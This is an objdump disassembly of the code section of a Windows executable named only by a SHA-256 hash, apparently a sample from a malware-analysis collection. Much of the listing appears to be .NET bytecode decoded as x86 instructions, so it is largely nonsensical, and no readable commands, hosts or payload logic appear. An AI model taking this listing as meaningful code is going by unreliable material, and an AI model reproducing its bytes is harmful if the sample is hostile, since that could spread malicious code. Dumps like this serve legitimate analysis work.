
608c9793c4e7a8ccd7ac8899133de7ff7c6e78528fe1e4dc03e19999b435c101.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	push   eax
  402001:	pop    ebx
  402002:	add    BYTE PTR [eax],al
  402004:	add    BYTE PTR [eax],al
  402006:	add    BYTE PTR [eax],al
  402008:	dec    eax
  402009:	add    BYTE PTR [eax],al
  40200b:	add    BYTE PTR [edx],al
  40200d:	add    BYTE PTR ds:0x33e400,al
  402013:	add    BYTE PTR [esi+eiz*1+0x90000],ah
  40201a:	add    BYTE PTR [eax],al
  40201c:	add    DWORD PTR [eax],eax
  40201e:	add    BYTE PTR [esi],al
  402020:	mov    BYTE PTR [edi],ah
  402022:	add    BYTE PTR [eax],al
  402024:	pop    ecx
  402025:	or     al,0x0
  402027:	add    BYTE PTR [eax+0x20],dl
  40202a:	add    BYTE PTR [eax],al
  40202c:	add    BYTE PTR [eax],0x0
	...
  40204f:	add    BYTE PTR [edi],ah
  402051:	jl     0x40200c
  402053:	es inc esp
  402055:	mov    ebp,0x3a6dc7c8
  40205a:	push   eax
  40205b:	push   edx
  40205c:	aam    0x64
  40205e:	stos   BYTE PTR es:[edi],al
  40205f:	sbb    bh,al
  402061:	xchg   ecx,eax
  402062:	(bad)  
  402063:	sti    
  402064:	xlat   BYTE PTR ds:[ebx]
  402065:	leave  
  402066:	sahf   
  402067:	hlt    
  402068:	sub    DWORD PTR [eax-0x52],edi
  40206b:	cld    
  40206c:	or     edx,DWORD PTR [ebx]
  40206e:	mov    ah,0xb1
  402070:	add    edx,ebx
  402072:	mov    fs,WORD PTR [eax]
  402074:	dec    ecx
  402075:	cmp    cl,ch
  402077:	gs add al,0x7b
  40207a:	mov    ecx,0x20a22a29
  40207f:	adc    dl,al
  402081:	test   eax,0xd3f9e186
  402086:	add    edi,DWORD PTR [edx-0x7e498bdf]
  40208c:	mov    al,0x2a
  40208e:	shl    DWORD PTR [ecx+0x63],0x61
  402092:	std    
  402093:	lods   al,BYTE PTR ds:[esi]
  402094:	mov    esp,0xd5992a94
  402099:	mov    ebp,0x1e518413
  40209e:	add    eax,0x53702e1
  4020a3:	jmp    0x402047
  4020a5:	out    dx,eax
  4020a6:	mov    ah,0x74
  4020a8:	sbb    ebp,DWORD PTR [ebx+0x4d]
  4020ab:	inc    esi
  4020ac:	dec    ecx
  4020ad:	mov    ebp,0x35deaf5d
  4020b2:	mov    edx,cs
  4020b4:	pop    ecx
  4020b5:	jge    0x4020c6
  4020b7:	arpl   WORD PTR [ebx-0x51],cx
  4020ba:	imul   edx,DWORD PTR [eax+ebx*4-0x11],0xffffffa1
  4020bf:	clc    
  4020c0:	sub    eax,0x86585bf
  4020c5:	fldcw  WORD PTR [esi+0x2ca7f332]
  4020cb:	imul   eax,DWORD PTR [ecx],0x1b527224
  4020d1:	xor    BYTE PTR [edi],al
  4020d3:	add    cl,cl
  4020d5:	add    DWORD PTR [eax],eax
  4020d7:	add    BYTE PTR [ecx],al
  4020d9:	add    BYTE PTR [eax],al
  4020db:	adc    DWORD PTR [edx+0x1],esi
  4020de:	add    BYTE PTR [eax],al
  4020e0:	jo     0x4020fa
  4020e2:	sub    BYTE PTR [eax+eax*1],dl
  4020e5:	add    BYTE PTR [edx],cl
  4020e7:	or     esi,DWORD PTR [edx+0x1]
  4020ea:	add    BYTE PTR [eax],al
  4020ec:	jo     0x402104
  4020ee:	sub    BYTE PTR [eax+eax*1],dl
  4020f1:	add    BYTE PTR [edx],cl
  4020f3:	or     al,0x7
  4020f5:	or     BYTE PTR [ebx],bl
  4020f7:	sub    BYTE PTR ds:0x2c0a0000,dl
  4020fd:	or     esi,DWORD PTR [edx+0x1]
  402100:	add    BYTE PTR [eax],al
  402102:	jo     0x40210b
  402104:	sub    BYTE PTR [esi],dl
  402106:	add    BYTE PTR [eax],al
  402108:	or     dh,BYTE PTR [edx+0x1b]
  40210b:	add    BYTE PTR [eax],al
  40210d:	jo     0x40211c
  40210f:	jle    0x402128
  402111:	add    BYTE PTR [eax],al
  402113:	or     dh,BYTE PTR [edx+0x31]
  402116:	add    BYTE PTR [eax],al
  402118:	jo     0x402189
  40211a:	sbb    BYTE PTR [eax],al
  40211c:	add    BYTE PTR [edx],cl
  40211e:	adc    eax,DWORD PTR [ecx+edx*1]
  402121:	add    al,0x2c
  402123:	adc    dl,BYTE PTR [ecx]
  402125:	add    al,0x72
  402127:	jmp    0x19:0x6f700000
  40212e:	add    BYTE PTR [edx],cl
  402130:	je     0x40214f
  402132:	add    BYTE PTR [eax],al
  402134:	add    DWORD PTR ds:0x4110cde,ecx
  40213a:	sub    al,0x7
  40213c:	adc    DWORD PTR [edi+ebp*2],eax
  40213f:	sbb    al,BYTE PTR [eax]
  402141:	add    BYTE PTR [edx],cl
  402143:	fsubr  QWORD PTR [eax]
  402145:	sbb    eax,DWORD PTR [eax]
  402147:	add    BYTE PTR [edx],cl
  402149:	adc    eax,DWORD PTR ds:0x1c6f0511
  40214f:	add    BYTE PTR [eax],al
  402151:	or     cl,BYTE PTR [edx]
  402153:	push   es
  402154:	outs   dx,DWORD PTR ds:[esi]
  402155:	sbb    eax,0x720a0000
  40215a:	or     al,BYTE PTR [ecx]
  40215c:	add    BYTE PTR [eax+0x28],dh
  40215f:	push   ds
  402160:	add    BYTE PTR [eax],al
  402162:	or     dh,BYTE PTR [edx+0x18]
  402165:	add    DWORD PTR [eax],eax
  402167:	jo     0x402180
  402169:	lea    eax,[ecx]
  40216b:	add    BYTE PTR [eax],al
  40216d:	add    DWORD PTR [ebx],edx
  40216f:	or     al,0x11
  402171:	or     al,0x16
  402173:	or     DWORD PTR [edx+0x1f280c11],esp
  402179:	add    BYTE PTR [eax],al
  40217b:	or     dh,BYTE PTR [ebx+0x20]
  40217e:	add    BYTE PTR [eax],al
  402180:	or     ch,BYTE PTR [edi+0x21]
  402183:	add    BYTE PTR [eax],al
  402185:	or     al,BYTE PTR [esi]
  402187:	outs   dx,DWORD PTR ds:[esi]
  402188:	sbb    eax,0x720a0000
  40218d:	je     0x402190
  40218f:	add    BYTE PTR [eax+0x72],dh
  402192:	add    BYTE PTR [ecx],0x0
  402195:	jo     0x40220a
  402197:	and    BYTE PTR [eax],al
  402199:	add    BYTE PTR [edx],cl
  40219b:	outs   dx,DWORD PTR ds:[esi]
  40219c:	and    DWORD PTR [eax],eax
  40219e:	add    BYTE PTR [edx],cl
  4021a0:	fisub  WORD PTR [eax]
  4021a2:	adc    eax,DWORD PTR [esi]
  4021a4:	sub    BYTE PTR [edx],ah
  4021a6:	add    BYTE PTR [eax],al
  4021a8:	or     ch,BYTE PTR [eax]
  4021aa:	or     DWORD PTR [eax],eax
  4021ac:	add    BYTE PTR [esi],al
  4021ae:	adc    DWORD PTR [esi],eax
  4021b0:	outs   dx,DWORD PTR ds:[esi]
  4021b1:	and    eax,DWORD PTR [eax]
  4021b3:	add    BYTE PTR [edx],cl
  4021b5:	outs   dx,DWORD PTR ds:[esi]
  4021b6:	and    al,0x0
  4021b8:	add    BYTE PTR [edx],cl
  4021ba:	pop    ss
  4021bb:	adc    ecx,DWORD PTR [ebx]
  4021bd:	fucom  st(0)
  4021bf:	add    BYTE PTR [eax],al
  4021c1:	add    BYTE PTR [edx],al
  4021c3:	mov    gs,WORD PTR [ecx+0x16]
  4021c6:	xor    DWORD PTR [edi],edx
  4021c8:	add    dl,BYTE PTR [esi]
  4021ca:	call   0x1a70:0x1d672
  4021d1:	outs   dx,DWORD PTR ds:[esi]
  4021d2:	and    eax,0x2c0a0000
  4021d7:	pop    es
  4021d8:	push   es
  4021d9:	sub    BYTE PTR [edx],al
  4021db:	add    BYTE PTR [eax],al
  4021dd:	push   es
  4021de:	sub    dl,al
  4021e0:	add    al,BYTE PTR [eax]
  4021e2:	add    BYTE PTR [edx],al
  4021e4:	sub    BYTE PTR [esi],ah
  4021e6:	add    BYTE PTR [eax],al
  4021e8:	or     ch,BYTE PTR [edi+0x27]
  4021eb:	add    BYTE PTR [eax],al
  4021ed:	or     dl,al
  4021ef:	adc    BYTE PTR [eax],al
  4021f1:	add    BYTE PTR [ecx],al
  4021f3:	sub    BYTE PTR [esi],ah
  4021f5:	add    BYTE PTR [eax],al
  4021f7:	or     dl,BYTE PTR [esi]
  4021f9:	outs   dx,DWORD PTR ds:[esi]
  4021fa:	sub    BYTE PTR [eax],al
  4021fc:	add    BYTE PTR [edx],cl
  4021fe:	je     0x402202
  402200:	add    BYTE PTR [eax],al
  402202:	sbb    edx,DWORD PTR [ebx]
  402204:	pop    es
  402205:	rol    BYTE PTR [edx],1
  402207:	add    BYTE PTR [eax],al
  402209:	add    ch,BYTE PTR [eax]
  40220b:	add    BYTE PTR es:[eax],al
  40220e:	or     ch,BYTE PTR [edi+0x27]
  402211:	add    BYTE PTR [eax],al
  402213:	or     dl,al
  402215:	or     al,0x0
  402217:	add    BYTE PTR [ecx],al
  402219:	sub    BYTE PTR [esi],ah
  40221b:	add    BYTE PTR [eax],al
  40221d:	or     dl,BYTE PTR [esi]
  40221f:	outs   dx,DWORD PTR ds:[esi]
  402220:	sub    BYTE PTR [eax],al
  402222:	add    BYTE PTR [edx],cl
  402224:	je     0x402229
  402226:	add    BYTE PTR [eax],al
  402228:	sbb    edx,DWORD PTR [ebx]
  40222a:	or     al,dl
  40222c:	add    al,BYTE PTR [eax]
  40222e:	add    BYTE PTR [edx],al
  402230:	sub    BYTE PTR [esi],ah
  402232:	add    BYTE PTR [eax],al
  402234:	or     ch,BYTE PTR [edi+0x27]
  402237:	add    BYTE PTR [eax],al
  402239:	or     dl,al
  40223b:	or     DWORD PTR [eax],eax
  40223d:	add    BYTE PTR [ecx],al
  40223f:	sub    BYTE PTR [esi],ah
  402241:	add    BYTE PTR [eax],al
  402243:	or     dl,BYTE PTR [esi]
  402245:	outs   dx,DWORD PTR ds:[esi]
  402246:	sub    BYTE PTR [eax],al
  402248:	add    BYTE PTR [edx],cl
  40224a:	je     0x402250
  40224c:	add    BYTE PTR [eax],al
  40224e:	sbb    edx,DWORD PTR [ebx]
  402250:	or     DWORD PTR [eax],ebp
  402252:	push   ds
  402253:	add    BYTE PTR [eax],al
  402255:	or     ch,BYTE PTR [eax]
  402257:	or     al,BYTE PTR [eax]
  402259:	add    BYTE PTR [esi],al
  40225b:	sbb    DWORD PTR [ebp+0x1000001],ecx
  402261:	adc    ecx,DWORD PTR ds:0x11160d11
  402267:	pop    es
  402268:	push   ss
  402269:	call   0xa20a:0x296f
  402270:	adc    DWORD PTR ds:0x16081117,ecx
  402276:	call   0xa20a:0x2a6f
  40227d:	adc    DWORD PTR ds:0x16091118,ecx
  402283:	call   0xa20a:0x2b6f
  40228a:	adc    DWORD PTR ds:0x1f28,ecx
  402290:	or     dl,BYTE PTR [ebx]
  402292:	or     al,BYTE PTR [esi]
  402294:	adc    DWORD PTR [edx],ecx
  402296:	sub    BYTE PTR [ebx],cl
  402298:	add    BYTE PTR [eax],al
  40229a:	push   es
  40229b:	add    ch,BYTE PTR [eax]
  40229d:	sub    al,0x0
  40229f:	add    BYTE PTR [edx],cl
  4022a1:	sub    dl,BYTE PTR [ecx]
  4022a3:	or     ebp,DWORD PTR [edx]
  4022a5:	add    BYTE PTR [eax],al
  4022a7:	add    BYTE PTR [ecx],al
  4022a9:	sbb    al,0x0
  4022ab:	add    BYTE PTR [edx],al
  4022ad:	add    BYTE PTR [eax+eax*1+0x18],al
  4022b1:	pop    esp
  4022b2:	add    BYTE PTR [eax+eax*1],cl
  4022b5:	add    BYTE PTR [eax],al
  4022b7:	add    BYTE PTR [eax],al
  4022b9:	add    BYTE PTR [eax],al
  4022bb:	add    dh,al
  4022bd:	mov    BYTE PTR [eax],0x20
  4022c0:	sub    DWORD PTR [eax],eax
  4022c2:	add    BYTE PTR [ecx],al
  4022c4:	sbb    esi,DWORD PTR [eax]
  4022c6:	push   es
  4022c7:	add    BYTE PTR [edx],cl
  4022c9:	add    al,BYTE PTR [eax]
  4022cb:	add    BYTE PTR [ebx],al
  4022cd:	add    BYTE PTR [eax],al
  4022cf:	adc    DWORD PTR [esi+0x2d],edi
  4022d2:	add    BYTE PTR [eax],al
  4022d4:	or     cl,BYTE PTR [edx]
  4022d6:	push   ss
  4022d7:	or     ebp,DWORD PTR [eax]
  4022d9:	add    BYTE PTR cs:[eax],al
  4022dc:	or     ch,BYTE PTR [eax]
  4022de:	das    
  4022df:	add    BYTE PTR [eax],al
  4022e1:	or     dh,BYTE PTR [ebx+0x30]
  4022e4:	add    BYTE PTR [eax],al
  4022e6:	or     cl,BYTE PTR [eax+ecx*1]
  4022e9:	outs   dx,DWORD PTR ds:[esi]
  4022ea:	xor    DWORD PTR [eax],eax
  4022ec:	add    BYTE PTR [edx],cl
  4022ee:	or     cl,BYTE PTR [eax]
  4022f0:	outs   dx,DWORD PTR ds:[esi]
  4022f1:	xor    al,BYTE PTR [eax]
  4022f3:	add    BYTE PTR [edx],cl
  4022f5:	fimul  WORD PTR [esi+0xd]
  4022f8:	sub    BYTE PTR [edx],ah
  4022fa:	add    BYTE PTR [eax],al
  4022fc:	or     ch,BYTE PTR [eax]
  4022fe:	push   ds
  4022ff:	add    BYTE PTR [eax],al
  402301:	or     ch,BYTE PTR [eax]
  402303:	or     al,0x0
  402305:	add    BYTE PTR [esi],al
  402307:	pop    ss
  402308:	lea    eax,[ecx]
  40230a:	add    BYTE PTR [eax],al
  40230c:	add    DWORD PTR [ebx],edx
  40230e:	or     dl,BYTE PTR [ecx]
  402310:	or     dl,BYTE PTR [esi]
  402312:	or     DWORD PTR [edi+0x23],ebp
  402315:	add    BYTE PTR [eax],al
  402317:	or     ah,BYTE PTR [edx+0x1f280a11]
  40231d:	add    BYTE PTR [eax],al
  40231f:	or     ch,BYTE PTR [edi+0x33]
  402322:	add    BYTE PTR [eax],al
  402324:	or     dl,BYTE PTR ds:0xaadd0913
  40232a:	add    DWORD PTR [eax],eax
  40232c:	add    BYTE PTR [esi],ah
  40232e:	sub    BYTE PTR [edx],ah
  402330:	add    BYTE PTR [eax],al
  402332:	or     ch,BYTE PTR [eax]
  402334:	or     eax,0x6f060000
  402339:	xor    eax,DWORD PTR [eax]
  40233b:	add    BYTE PTR [edx],cl
  40233d:	adc    eax,0x92dd0913
  402342:	add    DWORD PTR [eax],eax
  402344:	add    BYTE PTR [esi],al
  402346:	sub    BYTE PTR [eax+eax*1],dh
  402349:	add    BYTE PTR [edx],cl
  40234b:	sub    al,0x11
  40234d:	sub    BYTE PTR [edx],ah
  40234f:	add    BYTE PTR [eax],al
  402351:	or     ch,BYTE PTR [eax]
  402353:	push   cs
  402354:	add    BYTE PTR [eax],al
  402356:	push   es
  402357:	outs   dx,DWORD PTR ds:[esi]
  402358:	xor    eax,DWORD PTR [eax]
  40235a:	add    BYTE PTR [edx],cl
  40235c:	adc    eax,0x3528022a
  402361:	add    BYTE PTR [eax],al
  402363:	or     dl,BYTE PTR [ebx]
  402365:	add    al,0x11
  402367:	add    al,0x6f
  402369:	add    BYTE PTR ss:[eax],al
  40236c:	or     dl,BYTE PTR [ecx]
  40236e:	add    al,0x6f
  402370:	aaa    
  402371:	add    BYTE PTR [eax],al
  402373:	or     dl,BYTE PTR [ebx]
  402375:	add    eax,0x1d6f02
  40237a:	add    BYTE PTR [edx],cl
  40237c:	outs   dx,DWORD PTR ds:[esi]
  40237d:	cmp    BYTE PTR [eax],al
  40237f:	add    BYTE PTR [edx],cl
  402381:	adc    ecx,DWORD PTR [ebx]
  402383:	sub    ebx,DWORD PTR [ecx+edx*1]
  402386:	or     ebp,DWORD PTR [edi+0x39]
  402389:	add    BYTE PTR [eax],al
  40238b:	or     dl,BYTE PTR [ebx]
  40238d:	push   es
  40238e:	adc    DWORD PTR ds:0x3a6f,eax
  402394:	or     dl,BYTE PTR [ecx]
  402396:	push   es
  402397:	outs   dx,DWORD PTR ds:[esi]
  402398:	cmp    eax,DWORD PTR [eax]
  40239a:	add    BYTE PTR [edx],cl
  40239c:	outs   dx,DWORD PTR ds:[esi]
  40239d:	cmp    al,0x0
  40239f:	add    BYTE PTR [edx],cl
  4023a1:	adc    DWORD PTR [ebx],ecx
  4023a3:	outs   dx,DWORD PTR ds:[esi]
  4023a4:	cmp    eax,0x2d0a0000
  4023a9:	fcmovnu st,st(6)
  4023ab:	or     al,0x11
  4023ad:	or     ebp,DWORD PTR [edi+eax*1]
  4023b0:	adc    DWORD PTR [ebx],ecx
  4023b2:	outs   dx,DWORD PTR ds:[esi]
  4023b3:	sbb    al,BYTE PTR [eax]
  4023b5:	add    BYTE PTR [edx],cl
  4023b7:	fcom   QWORD PTR [ecx]
  4023b9:	add    eax,0x3a6f
  4023be:	or     al,BYTE PTR [esi]
  4023c0:	outs   dx,DWORD PTR ds:[esi]
  4023c1:	cmp    al,0x0
  4023c3:	add    BYTE PTR [edx],cl
  4023c5:	adc    DWORD PTR ds:0x3a6f,eax
  4023cb:	or     dh,BYTE PTR [edx-0x18]
  4023ce:	add    DWORD PTR [eax],eax
  4023d0:	jo     0x402441
  4023d2:	add    BYTE PTR ds:[eax],al
  4023d5:	or     dl,BYTE PTR [ecx]
  4023d7:	add    eax,0x3f6f
  4023dc:	or     ch,BYTE PTR [edi+0x40]
  4023df:	add    BYTE PTR [eax],al
  4023e1:	or     dl,BYTE PTR [ecx]
  4023e3:	add    eax,0x416f
  4023e8:	or     ch,BYTE PTR [ebx]
  4023ea:	sbb    ebp,DWORD PTR [eax]
  4023ec:	inc    edx
  4023ed:	add    BYTE PTR [eax],al
  4023ef:	or     dl,BYTE PTR [ecx]
  4023f1:	add    eax,0x436f
  4023f6:	or     ch,BYTE PTR [edi+0x44]
  4023f9:	add    BYTE PTR [eax],al
  4023fb:	or     ch,BYTE PTR [edi+0x45]
  4023fe:	add    BYTE PTR [eax],al
  402400:	or     ch,BYTE PTR [edi+0x33]
  402403:	add    BYTE PTR [eax],al
  402405:	or     dl,BYTE PTR [ecx]
  402407:	add    eax,0x436f
  40240c:	or     ch,BYTE PTR [edi+0x46]
  40240f:	add    BYTE PTR [eax],al
  402411:	or     ch,BYTE PTR [edi+edx*8]
  402414:	adc    DWORD PTR ds:0x476f,eax
  40241a:	or     ch,BYTE PTR [edi+0x48]
  40241d:	add    BYTE PTR [eax],al
  40241f:	or     ch,BYTE PTR ds:0x6f05113f
  402425:	inc    edi
  402426:	add    BYTE PTR [eax],al
  402428:	or     ch,BYTE PTR [edi+0x49]
  40242b:	add    BYTE PTR [eax],al
  40242d:	or     dl,BYTE PTR [esi]
  40242f:	xor    DWORD PTR [eax],esi
  402431:	sub    BYTE PTR [edx],ah
  402433:	add    BYTE PTR [eax],al
  402435:	or     ch,BYTE PTR [eax]
  402437:	adc    BYTE PTR [eax],al
  402439:	add    BYTE PTR [esi],al
  40243b:	outs   dx,DWORD PTR ds:[esi]
  40243c:	xor    eax,DWORD PTR [eax]
  40243e:	add    BYTE PTR [edx],cl
  402440:	sub    ebx,DWORD PTR [edi]
  402442:	adc    DWORD PTR ds:0x476f,eax
  402448:	or     ch,BYTE PTR [edi+0x4a]
  40244b:	add    BYTE PTR [eax],al
  40244d:	or     dl,BYTE PTR [ebx]
  40244f:	pop    es
  402450:	sub    BYTE PTR [edx],ah
  402452:	add    BYTE PTR [eax],al
  402454:	or     dl,BYTE PTR [ecx]
  402456:	pop    es
  402457:	sub    BYTE PTR [ebx],al
  402459:	add    BYTE PTR [eax],al
  40245b:	push   es
  40245c:	outs   dx,DWORD PTR ds:[esi]
  40245d:	xor    eax,DWORD PTR [eax]
  40245f:	add    BYTE PTR [edx],cl
  402461:	adc    DWORD PTR ds:0x476f,eax
  402467:	or     ch,BYTE PTR [edi+0x48]
  40246a:	add    BYTE PTR [eax],al
  40246c:	or     ch,BYTE PTR [ebx+edx*8]
  40246f:	adc    DWORD PTR ds:0x4b6f,eax
  402475:	or     ch,BYTE PTR [edi+0x4c]
  402478:	add    BYTE PTR [eax],al
  40247a:	or     bl,BYTE PTR [edx]
  40247c:	sub    edx,DWORD PTR cs:[ecx]
  40247f:	add    eax,0x4b6f
  402484:	or     ch,BYTE PTR [edi+0x4d]
  402487:	add    BYTE PTR [eax],al
  402489:	or     ch,BYTE PTR [ebx*1+0x2228]
  402490:	or     dl,BYTE PTR [ecx]
  402492:	add    eax,0x4b6f
  402497:	or     ch,BYTE PTR [edi+0x4d]
  40249a:	add    BYTE PTR [eax],al
  40249c:	or     ch,BYTE PTR [eax]
  40249e:	add    eax,DWORD PTR [eax]
  4024a0:	add    BYTE PTR [esi],al
  4024a2:	outs   dx,DWORD PTR ds:[esi]
  4024a3:	xor    eax,DWORD PTR [eax]
  4024a5:	add    BYTE PTR [edx],cl
  4024a7:	adc    eax,0x513140b
  4024ac:	adc    DWORD PTR [edi+ebp*2],eax
  4024af:	dec    esi
  4024b0:	add    BYTE PTR [eax],al
  4024b2:	or     dl,BYTE PTR [ebx+edx*1]
  4024b5:	add    al,0xde
  4024b7:	sbb    eax,0x22280813
  4024bc:	add    BYTE PTR [eax],al
  4024be:	or     dl,BYTE PTR [ecx]
  4024c0:	or     BYTE PTR [edi+0x4f],ch
  4024c3:	add    BYTE PTR [eax],al
  4024c5:	or     ch,BYTE PTR [eax]
  4024c7:	add    al,0x0
  4024c9:	add    BYTE PTR [esi],al
  4024cb:	outs   dx,DWORD PTR ds:[esi]
  4024cc:	xor    eax,DWORD PTR [eax]
  4024ce:	add    BYTE PTR [edx],cl
  4024d0:	adc    eax,0x2de0913
  4024d5:	pop    es
  4024d6:	sub    dl,BYTE PTR [ecx]
  4024d8:	or     DWORD PTR [edx],ebp
  4024da:	add    BYTE PTR [eax],al
  4024dc:	inc    ecx
  4024dd:	add    BYTE PTR fs:[eax],al
  4024e0:	add    BYTE PTR [eax],al
  4024e2:	add    BYTE PTR [eax],al
  4024e4:	or     BYTE PTR [eax],al
  4024e6:	add    BYTE PTR [eax],al
  4024e8:	pop    ds
  4024e9:	add    BYTE PTR [eax],al
  4024eb:	add    BYTE PTR [edi],ah
  4024ed:	add    BYTE PTR [eax],al
  4024ef:	add    BYTE PTR [esi],dh
  4024f1:	add    BYTE PTR [eax],al
  4024f3:	add    BYTE PTR ds:0x10000,bh
  4024f9:	add    BYTE PTR [eax],al
  4024fb:	add    BYTE PTR [eax],cl
  4024fd:	add    BYTE PTR [eax],al
  4024ff:	add    BYTE PTR [edi],bl
  402501:	add    BYTE PTR [eax],al
  402503:	add    BYTE PTR [ebp+0x0],bl
  402506:	add    BYTE PTR [eax],al
  402508:	sbb    BYTE PTR [eax],al
  40250a:	add    BYTE PTR [eax],al
  40250c:	add    BYTE PTR ds:[eax],al
  40250f:	add    DWORD PTR [edx],eax
  402511:	add    BYTE PTR [eax],al
  402513:	add    BYTE PTR [ebx+0x29000000],dh
  402519:	add    BYTE PTR [eax],al
  40251b:	add    ah,bl
  40251d:	add    BYTE PTR [eax],al
  40251f:	add    BYTE PTR [eax+eax*1],cl
	...
  40252a:	add    BYTE PTR [eax],al
  40252c:	mov    es,WORD PTR [eax]
  40252e:	add    BYTE PTR [eax],al
  402530:	pop    edx
  402531:	add    DWORD PTR [eax],eax
  402533:	add    al,ch
  402535:	add    DWORD PTR [eax],eax
  402537:	add    BYTE PTR ds:0x3c000000,bl
  40253d:	add    BYTE PTR [eax],al
  40253f:	add    DWORD PTR [ebx],edx
  402541:	xor    BYTE PTR [ecx],al
  402543:	add    BYTE PTR [edx+0x0],dl
  402546:	add    BYTE PTR [eax],al
  402548:	add    al,0x0
  40254a:	add    BYTE PTR [ecx],dl
  40254c:	add    dh,BYTE PTR [ebp+0x3c]
  40254f:	add    BYTE PTR [eax],al
  402551:	add    DWORD PTR [ecx+edx*1],ebp
  402554:	add    dh,BYTE PTR [esp+edi*1+0x0]
  402558:	add    BYTE PTR [ecx],al
  40255a:	outs   dx,DWORD PTR ds:[esi]
  40255b:	dec    edi
  40255c:	add    BYTE PTR [eax],al
  40255e:	or     ch,BYTE PTR [eax]
  402560:	add    al,0x0
  402562:	add    BYTE PTR [esi],al
  402564:	sub    al,BYTE PTR [edx]
  402566:	jne    0x4025a1
  402568:	add    BYTE PTR [eax],al
  40256a:	add    DWORD PTR [edx+ebp*1],ebp
  40256d:	add    dh,BYTE PTR [ecx+edi*1+0x0]
  402571:	add    BYTE PTR [ecx],al
  402573:	outs   dx,DWORD PTR ds:[esi]
  402574:	push   eax
  402575:	add    BYTE PTR [eax],al
  402577:	or     dh,BYTE PTR [ebp+0x3]
  40257a:	add    BYTE PTR [eax],al
  40257c:	add    DWORD PTR [eax+ebx*1],ebp
  40257f:	add    dh,BYTE PTR [ecx+edi*1+0x0]
  402583:	add    BYTE PTR [ecx],al
  402585:	outs   dx,DWORD PTR ds:[esi]
  402586:	push   eax
  402587:	add    BYTE PTR [eax],al
  402589:	or     dh,BYTE PTR [ebp+0x3]
  40258c:	add    BYTE PTR [eax],al
  40258e:	add    DWORD PTR [edx],ecx
  402590:	push   es
  402591:	sub    BYTE PTR [eax+eax*1],al
  402594:	add    BYTE PTR [esi],al
  402596:	sub    al,BYTE PTR [edx]
  402598:	outs   dx,DWORD PTR ds:[esi]
  402599:	inc    ebp
  40259a:	add    BYTE PTR [eax],al
  40259c:	or     ch,BYTE PTR [edx]
  40259e:	add    BYTE PTR [eax],al
  4025a0:	adc    esi,DWORD PTR [eax]
  4025a2:	add    eax,DWORD PTR [eax]
  4025a4:	pusha  
  4025a5:	add    BYTE PTR [eax],al
  4025a7:	add    BYTE PTR ds:0x2110000,al
  4025ad:	outs   dx,DWORD PTR ds:[esi]
  4025ae:	push   ecx
  4025af:	add    BYTE PTR [eax],al
  4025b1:	or     cl,BYTE PTR [edx]
  4025b3:	jae    0x402607
  4025b5:	add    BYTE PTR [eax],al
  4025b7:	or     cl,BYTE PTR [ebx]
  4025b9:	sub    edx,DWORD PTR [edi+eax*1]
  4025bc:	push   es
  4025bd:	outs   dx,DWORD PTR ds:[esi]
  4025be:	and    eax,DWORD PTR [eax]
  4025c0:	add    BYTE PTR [edx],cl
  4025c2:	outs   dx,DWORD PTR ds:[esi]
  4025c3:	push   ebx
  4025c4:	add    BYTE PTR [eax],al
  4025c6:	or     ah,BYTE PTR [esi]
  4025c8:	push   es
  4025c9:	outs   dx,DWORD PTR ds:[esi]
  4025ca:	push   esp
  4025cb:	add    BYTE PTR [eax],al
  4025cd:	or     cl,BYTE PTR [edx]
  4025cf:	push   es
  4025d0:	sub    eax,0x556f02e9
  4025d5:	add    BYTE PTR [eax],al
  4025d7:	or     ch,BYTE PTR [esp]
  4025da:	add    ch,BYTE PTR [edi+0x55]
  4025dd:	add    BYTE PTR [eax],al
  4025df:	or     ch,BYTE PTR [edi+0x56]
  4025e2:	add    BYTE PTR [eax],al
  4025e4:	or     al,BYTE PTR [edx]
  4025e6:	outs   dx,DWORD PTR ds:[esi]
  4025e7:	push   ebp
  4025e8:	add    BYTE PTR [eax],al
  4025ea:	or     ch,BYTE PTR [edi+0x57]
  4025ed:	add    BYTE PTR [eax],al
  4025ef:	or     al,BYTE PTR [edi]
  4025f1:	outs   dx,DWORD PTR ds:[esi]
  4025f2:	inc    ebp
  4025f3:	add    BYTE PTR [eax],al
  4025f5:	or     ch,BYTE PTR [eax]
  4025f7:	adc    DWORD PTR [eax],eax
  4025f9:	add    BYTE PTR [esi],al
  4025fb:	or     al,0x2b
  4025fd:	or     al,0x7
  4025ff:	outs   dx,DWORD PTR ds:[esi]
  402600:	inc    ebp
  402601:	add    BYTE PTR [eax],al
  402603:	or     ch,BYTE PTR [eax]
  402605:	adc    al,BYTE PTR [eax]
  402607:	add    BYTE PTR [esi],al
  402609:	or     al,0x8
  40260b:	sub    bl,BYTE PTR [esi]
  40260d:	add    ch,BYTE PTR [eax]
  40260f:	pop    eax
  402610:	add    BYTE PTR [eax],al
  402612:	or     ch,BYTE PTR [edx]
  402614:	push   ds
  402615:	add    ch,BYTE PTR [eax]
  402617:	pop    eax
  402618:	add    BYTE PTR [eax],al
  40261a:	or     ch,BYTE PTR [edx]
  40261c:	sbb    ch,BYTE PTR [eax]
  40261e:	adc    al,0x0
  402620:	add    BYTE PTR [esi],al
  402622:	sub    bl,BYTE PTR [esi]
  402624:	add    ch,BYTE PTR [eax]
  402626:	adc    eax,0x2a060000
  40262b:	cs jb  0x40262c
  40262e:	add    DWORD PTR [eax],eax
  402630:	jo     0x40265a
  402632:	push   ss
  402633:	add    BYTE PTR [eax],al
  402635:	push   es
  402636:	sub    ch,BYTE PTR [esi]
  402638:	jb     0x40265a
  40263a:	add    al,BYTE PTR [eax]
  40263c:	jo     0x402666
  40263e:	push   ss
  40263f:	add    BYTE PTR [eax],al
  402641:	push   es
  402642:	sub    ch,BYTE PTR [esi]
  402644:	jb     0x402674
  402646:	add    al,BYTE PTR [eax]
  402648:	jo     0x402672
  40264a:	push   ss
  40264b:	add    BYTE PTR [eax],al
  40264d:	push   es
  40264e:	sub    ch,BYTE PTR [esi]
  402650:	jb     0x40268a
  402652:	add    al,BYTE PTR [eax]
  402654:	jo     0x40267e
  402656:	push   ss
  402657:	add    BYTE PTR [eax],al
  402659:	push   es
  40265a:	sub    ch,BYTE PTR [esi]
  40265c:	jb     0x4026bc
  40265e:	add    al,BYTE PTR [eax]
  402660:	jo     0x40268a
  402662:	push   ss
  402663:	add    BYTE PTR [eax],al
  402665:	push   es
  402666:	sub    ch,BYTE PTR [esi]
  402668:	jb     0x402606
  40266a:	add    al,BYTE PTR [eax]
  40266c:	jo     0x402696
  40266e:	push   ss
  40266f:	add    BYTE PTR [eax],al
  402671:	push   es
  402672:	sub    ch,BYTE PTR [esi]
  402674:	jb     0x402638
  402676:	add    al,BYTE PTR [eax]
